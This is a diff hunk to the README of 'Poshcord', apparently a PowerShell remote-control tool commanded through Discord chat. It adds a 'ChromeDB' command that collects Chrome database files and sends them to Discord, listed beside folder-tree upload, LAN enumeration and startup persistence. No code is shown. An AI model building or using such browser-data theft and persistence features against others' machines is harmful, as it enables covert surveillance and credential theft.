@@ -42,6 +42,7 @@ Every 10 seconds it will check for a new message in chat and interpret it as a c
 - **FolderTree**: Save folder trees to file and send to Discord
 - **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
 - **NearbyWifi**: Show nearby wifi networks (!user popup!)
+- **ChromeDB**:  Gather Database files from Chrome and send to Discord
 
 - **AddPersistance**: Add this script to startup.
 - **RemovePersistance**: Remove Poshcord from startup
